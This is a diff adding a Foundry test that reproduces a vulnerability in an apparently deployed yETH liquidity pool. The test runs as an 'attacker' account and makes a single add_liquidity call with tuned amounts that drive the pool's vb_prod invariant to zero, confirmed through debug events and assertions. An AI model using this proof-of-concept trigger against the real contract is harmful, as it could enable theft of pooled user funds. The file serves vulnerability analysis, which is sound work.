@@ -20,6 +20,8 @@ import "forge-std/Test.sol";
  * 3. Demonstrate that the product term multiplication causes the underflow
  */
 contract VbProdAnalysisTest is Test {
+    bytes32 constant DEBUG_ASSET = keccak256("DebugAddLiquidityAsset(uint256,uint256,uint256)");
+
     IPool public localPool;
     IPool public constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
     IERC20 public constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
@@ -398,5 +400,59 @@ contract VbProdAnalysisTest is Test {
         assertGt(r0, 0, "r should be non-zero after first iteration");
         assertApproxEqAbs(sp1, 442_133_785_438_299_819, 10_000_000, "second iteration supply (sp1) mismatch");
         assertEq(r1, 0, "r should be truncated to zero in second iteration");
+    }
+
+    /**
+     * @notice Repro from another team: a single huge, weight-balanced add drives vb_prod to 0 before _calc_supply.
+     */
+    function test_single_add_underflows_pow_up_to_zero() public {
+        address attacker = address(99);
+        vm.startPrank(attacker);
+
+        // Fund and approve (amounts are ~1e23 so give 2e23 headroom)
+        for (uint256 i = 0; i < 8; i++) {
+            address asset = POOL.assets(i);
+            deal(asset, attacker, 200_000e18);
+            IERC20(asset).approve(address(POOL), type(uint256).max);
+        }
+
+        // Initial rate update
+        uint256[] memory rates = new uint256[](8);
+        rates[0] = 0; rates[1] = 1; rates[2] = 2; rates[3] = 3;
+        rates[4] = 4; rates[5] = 5; rates[6] = 0; rates[7] = 0;
+        POOL.update_rates(rates);
+
+        uint256[] memory addAmounts = new uint256[](8);
+        addAmounts[0] = 90792216822266391680836;
+        addAmounts[1] = 84962679462594464377352;
+        addAmounts[2] = 48202522992040341387031;
+        addAmounts[3] = 46418034848838283973842;
+        addAmounts[4] = 45020163135733143529517;
+        addAmounts[5] = 117740327985498547365067;
+        addAmounts[6] = 11320275258698026173806;
+        addAmounts[7] = 11985985892296798352097;
+
+        // Run real add_liquidity and decode per-asset pow-up from DebugAddLiquidityAsset events
+        vm.recordLogs();
+        uint256 minted = POOL.add_liquidity(addAmounts, 0, attacker);
+        Vm.Log[] memory logsAsset = vm.getRecordedLogs();
+        uint256 lastProdAfter = 0;
+        for (uint256 i = 0; i < logsAsset.length; i++) {
+            Vm.Log memory lg = logsAsset[i];
+            if (lg.topics.length > 0 && lg.topics[0] == DEBUG_ASSET) {
+                uint256 assetIdx = uint256(lg.topics[1]);
+                (uint256 powUp, uint256 prodAfter) = abi.decode(lg.data, (uint256, uint256));
+                console.log("single-add asset", assetIdx, powUp, prodAfter);
+                lastProdAfter = prodAfter;
+            }
+        }
+        console.log("minted LP from add_liquidity", minted);
+        (uint256 prodAfterAdd, uint256 sumAfterAdd) = POOL.vb_prod_sum();
+        console.log("debug vb_prod_before_calc", POOL.debug_vb_prod_before_calc());
+        console.log("debug vb_sum_before_calc", POOL.debug_vb_sum_before_calc());
+        console.log("stored vb_prod after add", prodAfterAdd);
+        console.log("stored vb_sum after add", sumAfterAdd);
+        assertEq(prodAfterAdd, 0, "stored vb_prod should be zero after add");
+        assertEq(POOL.debug_vb_prod_before_calc(), lastProdAfter, "debug vb_prod_before_calc should match last DebugAsset prodAfter");
     }
 }
